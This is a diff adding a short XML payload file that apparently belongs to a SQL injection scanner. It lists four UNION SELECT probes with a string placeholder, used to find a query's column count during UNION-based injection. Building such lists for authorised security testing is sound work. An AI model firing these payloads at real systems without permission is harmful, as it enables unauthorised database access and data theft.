@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<payloads>
+    <technique name="union">
+        <payload>%s' UNION SELECT NULL-- -</payload>
+        <payload>%s' UNION SELECT NULL,NULL-- -</payload>
+        <payload>%s' UNION SELECT NULL,NULL,NULL-- -</payload>
+        <payload>%s' UNION ALL SELECT NULL-- -</payload>
+    </technique>
+</payloads>
